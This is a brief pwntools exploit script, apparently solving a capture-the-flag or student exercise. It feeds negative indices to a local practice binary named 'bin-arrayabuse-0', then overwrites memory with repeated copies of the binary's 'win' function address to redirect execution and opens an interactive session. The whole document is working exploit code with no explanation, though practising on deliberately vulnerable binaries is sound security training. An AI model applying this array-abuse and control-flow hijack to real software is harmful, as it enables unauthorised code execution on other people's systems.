from pwn import *


for i in range(10):
    io = process("./ace-student/test-bins/bin-arrayabuse-0")
    elf = ELF("./ace-student/test-bins/bin-arrayabuse-0")

    io.sendlineafter(b">>>", f"-{i}".encode())

    payload = p64(elf.sym["win"]) * 4

    io.sendlineafter(b">>>", payload)

    io.interactive()

